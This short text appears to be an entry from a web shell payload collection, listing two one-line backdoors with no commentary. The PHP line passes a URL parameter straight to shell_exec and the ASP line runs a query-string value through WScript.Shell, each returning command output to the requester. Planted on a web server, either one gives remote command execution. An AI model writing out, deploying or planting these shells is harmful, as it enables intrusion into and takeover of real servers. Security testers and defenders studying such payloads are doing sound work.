## PHP

<?php echo shell_exec($_GET['e'].' 2>&1'); ?>

## ASP

<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
